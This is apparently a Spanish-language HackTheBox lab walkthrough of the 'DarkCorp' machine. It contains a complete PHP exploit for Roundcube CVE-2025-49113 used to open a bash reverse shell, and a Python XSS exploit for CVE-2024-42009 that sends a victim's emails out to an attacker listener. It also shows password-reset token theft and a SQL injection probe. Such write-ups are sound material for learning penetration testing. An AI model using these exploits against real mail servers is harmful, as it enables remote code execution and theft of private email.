---
icon: flag
---

# DarkCorp HackTheBox (Insane)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 10:13 EDT
Nmap scan report for 10.10.11.54
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
```

Veremos simplemente `2` puertos, entre ellos el puerto `80` que aloja una pagina web, vamos a probar a entrar en dicha pagina.

```
URL = http://<IP>/
```

Veremos que nos esta redirigiendo a un `dominio` llamado `drip.htb` por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            drip.htb
```

Lo guardamos y entraremos pero directamente con el dominio:

```
URL = http://drip.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 115716.png" alt=""><figcaption></figcaption></figure>

Vemos que es una pagina dedicada a servicios de correo, vamos a realizar un poco de `fuzzing` a ver que podemos encontrar en dicha pagina.

Si le damos a `Sign in` para iniciar sesion, nos lleva a un `subdominio` llamado `mail` el cual tendremos que añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            drip.htb mail.drip.htb
```

Lo guardamos y entramos de nuevo.

```
URL = http://mail.drip.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 115732.png" alt=""><figcaption></figcaption></figure>

Vemos que utiliza de forma interna un `software` llamado `Webmail`, si buscamos la version o alguna vulnerabilidad asociada a dicho `software` veremos una en concreto.

URL = [CVE-2025-49113 exploit PoC GitHub](https://github.com/hakaioffsec/CVE-2025-49113-exploit/blob/main/CVE-2025-49113.php)

Buscando por internet encontre un repo en el que explicaba que hay una vulnerabilidad de `Roundcube Webmail Vulnerable to Authenticated RCE via PHP Object Deserialization` pero requiere que estes autenticado con credenciales para este `CVE-2025-49113`, por lo que vamos a irnos a la pagina principal y pulsar `Sign Up` para crear tus credenciales.

## Exploit CVE-2025-49113

Una vez que hayamos creado dichas credenciales (En mi caso `diseo:diseo`) podremos explotar la vulnerabilidad:

> exploit.php

```php
<?php
class Crypt_GPG_Engine
{
    public $_process = false;
    public $_gpgconf = '';
    public $_homedir = '';

    public function __construct($_gpgconf)
    {
        $_gpgconf = base64_encode($_gpgconf);
        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
    }

    public function gadget()
    {
        return '|'. serialize($this) . ';';
    }
}

function checkVersion($baseUrl)
{
    echo "[*] Checking Roundcube version...\n";
    
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
        ],
    ]);

    $response = file_get_contents($baseUrl, false, $context);
    
    if ($response === FALSE) {
        echo "[-] Error: Failed to check version.\n";
        exit(1);
    }

    $vulnerableVersions = [
        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
    ];

    preg_match('/"rcversion":(\d+)/', $response, $matches);
    
    if (empty($matches[1])) {
        echo "[-] Error: Could not detect Roundcube version.\n";
        exit(1);
    }

    $version = $matches[1];
    echo "[*] Detected Roundcube version: " . $version . "\n";

    if (in_array($version, $vulnerableVersions)) {
        echo "[+] Target is vulnerable!\n";
        return true;
    } else {
        echo "[-] Target is not vulnerable.\n";
        exit(1);
    }
}

function login($baseUrl, $user, $pass)
{
    // Configuration to capture session cookies
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
            // 'request_fulluri' => false, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ]);

    // Make a GET request to the initial page
    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "Error: Failed to obtain the initial page.\n";
        exit(1);
    }

    // Extract the 'roundcube_sessid' cookie
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    // Extract the CSRF token from the JavaScript code
    preg_match('/"request_token":"([^"]+)"/', $response, $matches);
    if (empty($matches[1])) {
        echo "Error: CSRF token not found.\n";
        exit(1);
    }

    $csrfToken = $matches[1];

    $url = $baseUrl . '/?_task=login';

    $data = http_build_query([
        '_token'    => $csrfToken,
        '_task'     => 'login',
        '_action'   => 'login',
        '_timezone' => 'America/Sao_Paulo',
        '_url'      => '',
        '_user'     => $user,
        '_pass'     => $pass,
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
                        "Cookie: " . $sessionCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to make the request.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status == 401) {
        echo "Error: Incorrect credentials.\n";
        exit(1);
    } elseif ($status != 302) {
        echo "Error: Request failed with status code $status.\n";
        exit(1);
    }

    // Extract the last 'roundcube_sessauth' cookie from the login response, ignoring the cookie with value '-del-'
    preg_match_all('/Set-Cookie: roundcube_sessauth=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessauth' cookie not found.\n";
        exit(1);
    }
    $authCookie = 'roundcube_sessauth=' . end($matches[1]);

    // Extract the 'roundcube_sessid' cookie from the login response
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    echo "[+] Login successful!\n";

    return [
        'sessionCookie' => $sessionCookie,
        'authCookie' => $authCookie,
    ];
}

function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
{
    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';

    // Hardcoded PNG image in base64
    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';

    // Decode the base64 image
    $fileContent = base64_decode($base64Image);
    if ($fileContent === FALSE) {
        echo "Error: Failed to decode the base64 image.\n";
        exit(1);
    }

    $boundary = uniqid();
    $data = "--" . $boundary . "\r\n" .
            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
            "Content-Type: image/png\r\n\r\n" .
            $fileContent . "\r\n" .
            "--" . $boundary . "--\r\n";

    $options = [
        'http' => [
            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    echo "[*] Exploiting...\n";
    
    $context  = stream_context_create($options);
    $result = file_get_contents($uploadUrl, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to send the file.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status != 200) {
        echo "Error: File upload failed with status code $status.\n";
        exit(1);
    }

    echo "[+] Gadget uploaded successfully!\n";
}

function exploit($baseUrl, $user, $pass, $rceCommand)
{
    echo "[+] Starting exploit (CVE-2025-49113)...\n";
    
    // Check version before proceeding
    checkVersion($baseUrl);
    
    // Instantiate the Crypt_GPG_Engine class with the RCE command
    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
    $gadget = $gpgEngine->gadget();

    // Escape double quotes in the gadget
    $gadget = str_replace('"', '\\"', $gadget);

    // Login and get session cookies
    $cookies = login($baseUrl, $user, $pass);

    // Upload the image with the gadget
    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
}

if ($argc !== 5) {
    echo "Usage: php CVE-2025-49113.php <url> <username> <password> <command>\n";
    exit(1);
}

$baseUrl = $argv[1];
$user = $argv[2];
$pass = $argv[3];
$rceCommand = $argv[4];

exploit($baseUrl, $user, $pass, $rceCommand);
```

Vamos a ejecutarlo de esta forma, pero antes nos pondremos a la escucha para saber que se esta ejecutando el comando de forma correcta:

```shell
python3 -m http.server 80
```

Ahora si ejecutamos lo siguiente:

```shell
php exploit.php 'http://mail.drip.htb' <USER> <PASSWORD> 'curl http://<IP_ATTACKER>/'
```

Info:

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10607
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

Veremos que ha funcionado, pero si volvemos a donde tenemos nuestro servidor de `python3` veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.54 - - [20/Oct/2025 10:26:05] "GET / HTTP/1.1" 200 -
```

Efectivamente vemos que `100%` ha funcionado, por lo que vamos a generar una `reverse shell` para obtener acceso inicial a la maquina de esta forma:

```shell
php exploit.php 'http://mail.drip.htb' diseo diseo 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"'
```

Info:

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10607
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.220] from (UNKNOWN) [10.10.11.54] 50358
bash: cannot set terminal process group (505): Inappropriate ioctl for device
bash: no job control in this shell
www-data@drip:/$ whoami
whoami
www-data
```

Pero es bastante raro ya que es una maquina `Windows` y no `Linux`, puede ser que sea una particion en el propio `Windows` que es la que aloja la pagina web, en vez de utilizar `IIS` utiliza `apache2`.

Si busco sobre la informacion de la maquina veremos que no es la escalada, por lo que vamos a seguir investigando un poco mas, ya que este acceso inicial no nos sirve de nada.

Si nos vamos a `Compose` veremos nuestro correo, vamos a probar a enviarnos por el contacto de la pagina un mensaje y lo capturaremos con `BurpSuite`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 124956.png" alt=""><figcaption></figcaption></figure>

Desde la pagina rellenaremos la info, para ver si nos llega en nuestra bandeja de entrada el mensaje.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 124945.png" alt=""><figcaption></figcaption></figure>

> Peticion BurpSuite (Envio de un correo)

```
POST /contact HTTP/1.1
Host: drip.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://drip.htb
Connection: keep-alive
Referer: http://drip.htb/index
Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNTk3OWZlM2FiMTdkNjY4ZjQ3YWFlZDljZTM5YzAwYTdkYWFkNzliNCJ9.aPdjzg.O06JUYAE37uG-aKI5Devt3nmwv4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=diseo&email=diseo%40drip.htb&message=TEST&content=text&recipient=support%40drip.htb
```

Probemos a modificar el correo de llegada en la seccion llamada `recipient` del nombre de `support` a nuestro usuario `diseo` en mi caso, dejandolo asi:

```
POST /contact HTTP/1.1
Host: drip.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://drip.htb
Connection: keep-alive
Referer: http://drip.htb/index
Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNTk3OWZlM2FiMTdkNjY4ZjQ3YWFlZDljZTM5YzAwYTdkYWFkNzliNCJ9.aPdjzg.O06JUYAE37uG-aKI5Devt3nmwv4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=diseo&email=diseo%40drip.htb&message=TEST&content=text&recipient=diseo%40drip.htb
```

Lo enviamos al `Repeater`, enviamos la peticion para que se ejecute y veremos que nos da un `Message sent successfully!` ahora si vamos a la bandeja de entrada de nuestro correo veremos que nos llego dicho mensaje.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 125650.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado esa modificacion y nos ha llegado el correo a nuestro correo personal en vez de al del usuario `support`.

Si buscamos informacion sobre la vulnerabilidad que explotamos anteriormente, veremos que respecto a dicha vulnerabilidad podremos hacer otras cosas como un `XSS` mediante el mensaje del correo electronico, para mas informacion tendremos esta pagina:

URL = [XSS roundcube webamil vuln](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/)

> Payload XSS mail

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

Ahora desde el `Repeater` en la peticion que capturamos lo vamos a dejar de esta forma:

```
POST /contact HTTP/1.1
Host: drip.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://drip.htb
Connection: keep-alive
Referer: http://drip.htb/index
Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNTk3OWZlM2FiMTdkNjY4ZjQ3YWFlZDljZTM5YzAwYTdkYWFkNzliNCJ9.aPdjzg.O06JUYAE37uG-aKI5Devt3nmwv4
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=diseo&email=diseo%40drip.htb&message=<body+title="bgcolor=foo"+name="bar+style=animation-name:progress-bar-stripes+onanimationstart=alert(origin)+foo=bar">Foo</body>&content=html&recipient=diseo%40drip.htb
```

Importante cambiar el `content` en `html` para que se cargue como tal, ahora si enviamos esto, veremos que nos llega el mensaje, pero si lo abrimos, veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 130447.png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando ese `XSS`, por lo que vamos a probar gracias a esta vulnerabilidad a inyectar un codigo de `HTML` con `JS` para obtener los correos del usuario `bcase@drip.htb` que vemos en el cuerpo del mensaje, tendremos que probar varios `ids` de la parte `uid=` para ver que mensaje es el que nos interesa, para ello el usuario tendra que abrir el correo y esto realizara una conexion a nuestro servidor activo de `python3` en formato codificado en `Base64` del cuerpo del mensaje de cada `ID` de correo.

## Escalate user bcase

Vamos a crear este codigo que obtuve de internet que aprovecha esta vulnerabilidad:

URL = [GitHub Vulnerabilidad PoC](https://github.com/0xbassiouny1337/CVE-2024-42009/blob/main/exploit.py)

Este codigo lo pegaremos en un archivo llamado `exploit.py`.

> exploit.py

```python
import requests
import base64
import threading
import logging
import urllib.parse
from lxml import html
from http.server import BaseHTTPRequestHandler, HTTPServer

# Configure debug logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")
DEBUG = 1  # Set to 1 to enable debugging, 0 to disable

def pr_debug(message):
    if DEBUG:
        logging.debug(message)

# Configuration
TARGET_EMAIL	= 'bcase@drip.htb'	# Change victim
TARGET_URL 		= "http://drip.htb/contact"
LISTEN_IP 		= "<IP_ATTACKER>"  # Change this
LISTEN_PORT		= 8000


class RequestHandler(BaseHTTPRequestHandler):
    """HTTP Server to Capture Stolen Mail via XSS"""
    def do_GET(self):
        pr_debug("Received request from HTTP server:")
        # pr_debug(self.path)

        # Parse the URL and query parameters
        parsed_path		= urllib.parse.urlparse(self.path)
        query_params	= urllib.parse.parse_qs(parsed_path.query)
        pr_debug(f"Query Parameters: {query_params}")

        if "c" in query_params:
            encoded_data = query_params["c"][0]

            # Fix incorrect padding issue
            encoded_data	= query_params["c"][0].replace(" ", "+")  
            missing_padding = len(encoded_data) % 4
            if missing_padding:
                encoded_data	+= "=" * (4 - missing_padding)

            # Decode Base64 properly
            decoded_data	= base64.b64decode(encoded_data).decode("utf-8", errors="ignore")
            print(f"[+] Captured XSS Response (Decoded Raw HTML):\n{decoded_data}")

            # Parse HTML and extract the message content
            tree		= html.fromstring(decoded_data)
            msg_body	= tree.xpath('//div[@id="messagebody"]')
            if msg_body:
                msg_text = "\n".join([el.text_content().strip() for el in msg_body])
                print("[+] Extracted Email Body:\n")
                print(msg_text)
            else:
                print("[!] No valid email body found.")

        else:
            print("[!] No 'c' parameter found in the request.")

        # Send a response
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

        
def start_http_server():
    """Starts an HTTP server in the background to capture XSS output."""
    server_address = ("0.0.0.0", LISTEN_PORT)
    httpd	= HTTPServer(server_address, RequestHandler)
    
    print(f"[*] Listening on port {LISTEN_PORT} to receive XSS response...")
    
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    
def send_post(uid):
    """Send a POST request to `/contact` endpoint with a crafted XSS payload."""
    HEADERS = {
        "Host": "drip.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
        "Referer": "http://drip.htb/index",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        #'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.Z6jHdA.NPFXb_71ADwUEcC3YvbodMqGmPY',
        "Connection": "close",
    }

    msg = (
        f'<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes '
        f'onanimationstart=fetch(\'/?_task=mail&_action=show&_uid={uid}&_mbox=INBOX&_extwin=1\').'
        f'then(r=>r.text()).then(m=>fetch(`http://{LISTEN_IP}:{LISTEN_PORT}/?c=${{btoa(m)}}`)) foo=bar">'
        "Foo</body>"
    )
    
    pr_debug(f"Sending payload to /contact: {msg}")

    post_data = {
        "name": "axura",
        "email": "root@drip.htb",
        "message": msg,
        "content": "html",
        "recipient": f"{TARGET_EMAIL}",
    }
    
    response = requests.post(TARGET_URL, data=post_data, headers=HEADERS)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

def main(uid):
    print("[*] Initializing attack...")

    # Start HTTP server in the background
    start_http_server()
    
    # Send the payload via POST to /contact
    send_post(uid)
    
    # Keep the script running to listen for XSS responses
    try:
        while True:
            pass  # Infinite loop to keep the server running
    except KeyboardInterrupt:
        print("\n[+] Stopping server.")

        
if __name__ == "__main__":
    import argparse

    parser	= argparse.ArgumentParser(description="Send XSS payload to Roundcube contact form.")
    parser.add_argument("--uid", "-u", type=int, required=True, help="The UID of the email to target (e.g., 4, 5, etc.)")
    args	= parser.parse_args()

    main(args.uid)
```

Ahora lo ejecutamos de esta forma:

```shell
python3 exploit.py --uid 2
```

Info:

```
[*] Initializing attack...
[*] Listening on port 8000 to receive XSS response...
2025-10-21 12:49:16,941 - DEBUG - Sending payload to /contact: <body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(m=>fetch(`http://10.10.14.220:8000/?c=${btoa(m)}`)) foo=bar">Foo</body>
2025-10-21 12:49:16,943 - DEBUG - Starting new HTTP connection (1): drip.htb:80
2025-10-21 12:49:17,077 - DEBUG - http://drip.htb:80 "POST /contact HTTP/1.1" 302 214
2025-10-21 12:49:17,078 - DEBUG - Resetting dropped connection: drip.htb
2025-10-21 12:49:17,144 - DEBUG - http://drip.htb:80 "GET /index HTTP/1.1" 200 None
[+] POST Request Sent! Status Code: 200
```

Veremos que se envio de forma correcta, y seguidamente ya nos pone a la escucha en un servidor de `python3` para que nos llegue dicha peticion, esperando un rato veremos lo siguiente:

```
2025-10-21 12:49:23,089 - DEBUG - Received request from HTTP server:
2025-10-21 12:49:23,089 - DEBUG - Query Parameters: {'c': ['PCFET0NUWVBFIGh0bWw Cgo8aHRtbCBsYW5nPSJlbiI Cgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPjx0aXRsZT5EcmlwTWFpbCBXZWJtYWlsIDo6IEN1c3RvbWVyIEluZm9ybWF0aW9uIFJlcXVlc3Q8L3RpdGxlPgoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHNocmluay10by1maXQ9bm8sIG1heGltdW0tc2NhbGU9MS4wIj48bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iI2Y0ZjRmNCI PG1ldGEgbmFtZT0ibXNhcHBsaWNhdGlvbi1uYXZidXR0b24tY29sb3IiIGNvbnRlbnQ9IiNmNGY0ZjQiPgoJPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJza2lucy9lbGFzdGljL2ltYWdlcy9mYXZpY29uLmljbz9zPTE3MTYxMDcyMzciPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJza2lucy9lbGFzdGljL2RlcHMvYm9vdHN0cmFwLm1pbi5jc3M/cz0xNzE2MTA3MjQ1Ij4KCQoJCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic2tpbnMvZWxhc3RpYy9zdHlsZXMvc3R5bGVzLm1pbi5jc3M/cz0xNzE2MTA3MjM3Ij4KCQkKCQoJCgkJPHNjcmlwdD4KCQl0cnkgewoJCQlpZiAoZG9jdW1lbnQuY29va2llLmluZGV4T2YoJ2NvbG9yTW9kZT1kYXJrJykgPiAtMQoJCQkJfHwgKGRvY3VtZW50LmNvb2tpZS5pbmRleE9mKCdjb2xvck1vZGU9bGlnaHQnKSA9PT0gLTEgJiYgd2luZG93Lm1hdGNoTWVkaWEoJyhwcmVmZXJzLWNvbG9yLXNjaGVtZTogZGFyayknKS5tYXRjaGVzKQoJCQkpIHsKCQkJCWRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5jbGFzc05hbWUgKz0gJyBkYXJrLW1vZGUnOwoJCQl9CgkJfSBjYXRjaCAoZSkgeyB9CgkJPC9zY3JpcHQ CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0e.........<RESTO_BASE64>
[+] Captured XSS Response (Decoded Raw HTML):
<!DOCTYPE html>

<html lang="en">

<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>DripMail Webmail :: Customer Information Request</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
        <link rel="shortcut icon" href="skins/elastic/images/favicon.ico?s=1716107237">
        <link rel="stylesheet" href="skins/elastic/deps/bootstrap.min.css?s=1716107245">

                <link rel="stylesheet" href="skins/elastic/styles/styles.min.css?s=1716107237">



                <script>..............<RESTO_HTML_DECODIFICADO>
```

De todo el codigo que nos ha decodificado, abajo del todo veremos que nos extrae el contenido del `Body`, despues de probar varios `IDs` el que nos dio informacion relevante fue el del `ID` numero `2`.

```
[+] Extracted Email Body:

Hey Bryce,

The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.

You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.

If you encounter any issues or have feedback, let me know so I can address them promptly.

Thanks
```

Veremos que hay un `subdominio` llamado `dev-a3f1-01.drip.htb` redirigiendo a una pagina en concreto el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              drip.htb mail.drip.htb dev-a3f1-01.drip.htb
```

Lo guardamos y entramos en dicha pagina:

```
URL = http://dev-a3f1-01.drip.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 143401.png" alt=""><figcaption></figcaption></figure>

## Escalate user postgres

### Reset password user bcase

Veremos que de primeras nos pone acceso denegado, si nos vamos a `LOGIN`, nos llevara a un `login` pero no tenemos credenciales, abajo veremos una opcion llamada `Reset Password` que es muy interesante:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-21 143517.png" alt=""><figcaption></figcaption></figure>

Vemos que ingresando un correo podremos resetear la contraseña de dicho usuario, podemos aprovechar la vulnerabilidad de antes, para enviar el correo del usuario `bryce` e interceptarlo para que podamos interactuar con el correo y cambiar la contraseña.

Si metemos el correo de `bcase@drip.htb` veremos que nos pone un mensaje `Reset token sent successfully.`.

Ahora vamos a volver a utilizar esta herramienta de antes para obtener el correo con el `ID` correspondiente, tendremos que ir probando a partir del `ID` numero `2` hasta saber cual es la siguiente correo del reseteo de contraseña.

```shell
python3 exploit.py --uid 5
```

Info:

```
..........................<RESTO_DE_INFO>..........................................
[+] Extracted Email Body:

Your reset token has generated. Please reset your password within the next 5 minutes.

You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aPiphg.sHA1X_DELE6Zlrq_lSeAUbLMSdA
..........................<RESTO_DE_INFO>..........................................
```

Veremos en el cuerpo del mensaje que nos llego el enlace para restablecer la contraseña, por lo que vamos a meternos ahi:

```
URL = http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aPiphg.sHA1X_DELE6Zlrq_lSeAUbLMSdA
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 115541.png" alt=""><figcaption></figcaption></figure>

Cuando hagamos esto nos pondra un mensaje de `Password successfully changed.` ahora si nos metemos con dichas credenciales con el usuario `bcase` y la contraseña que hayamos puesto veremos este `dashboard`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 115647.png" alt=""><figcaption></figcaption></figure>

Si nos vamos a la parte de `Analytics` veremos una barra de busqueda en la que si ponemos cualquier cosa como por ejemplo `test` veremos que nos da un error a nivel de `MySQL`:

```mysql
(psycopg2.errors.UndefinedColumn) column "test" does not exist LINE 1: SELECT * FROM "Users" WHERE "Users".username = test ^ [SQL: SELECT * FROM "Users" WHERE "Users".username = test] (Background on this error at: https://sqlalche.me/e/20/f405) 
```

Con esta informacion vamos a realizar esta inyeccion de `SQLi`.

### SQLi

```mysql
username;select 1,2,3,4,5,6
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-22 121106.png" alt=""><figcaption></figcaption></figure>

